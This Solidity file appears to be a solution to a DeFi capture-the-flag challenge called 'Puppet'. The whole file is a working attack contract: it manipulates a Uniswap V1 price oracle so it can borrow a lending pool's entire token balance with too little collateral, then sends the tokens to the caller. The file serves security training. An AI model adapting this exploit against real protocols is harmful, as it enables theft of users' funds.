// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IPuppetPool {
    function borrow(uint256 borrowAmount) external payable;

    function calculateDepositRequired(uint256 amount)
        external
        view
        returns (uint256);
}

interface IUniswapExchangeV1 {
    function tokenToEthSwapInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline
    ) external returns (uint256 eth_bought);

    function ethToTokenSwapInput(uint256 min_tokens, uint256 deadline)
        external
        payable
        returns (uint256 tokens_bought);
}

contract PuppetAttacker {
    IUniswapExchangeV1 exchange =
        IUniswapExchangeV1(0x75537828f2ce51be7289709686A69CbFDbB714F1);
    IPuppetPool pool = IPuppetPool(0x5FC8d32690cc91D4c39d9d3abcBD16989F875707);
    IERC20 token = IERC20(0x5FbDB2315678afecb367f032d93F642f64180aa3);

    function exploit() public {
        // First, exchange all tokens we have for ETH. This will cause the
        // exchange's ETH balance to decrease, and the exchange's token balance
        // to increase.
        token.approve(address(exchange), type(uint256).max);
        uint256 ethGained = exchange.tokenToEthSwapInput(
            token.balanceOf(address(this)),
            1,
            block.timestamp * 5
        );

        // Because of the way the deposit required is calculated by the lending
        // pool, we should now just be able to borrow all the tokens from
        // the lending pool.
        //
        // We already sent 24 ether to this contract. Using the
        // calculateDepositRequired() function, we can see that the deposit
        // required for the entire lending pool token balance is a bit over
        // 19 ether, so lets just send 20 ether
        pool.borrow{value: 20 ether}(token.balanceOf(address(pool)));

        // Use the amount of eth we got from the exchange to buy tokens back from
        // the exchange to satisfy the "greater than" condition
        exchange.ethToTokenSwapInput{value: ethGained}(1, block.timestamp * 5);

        // Now send the tokens to the attacker
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }

    receive() external payable {}
}
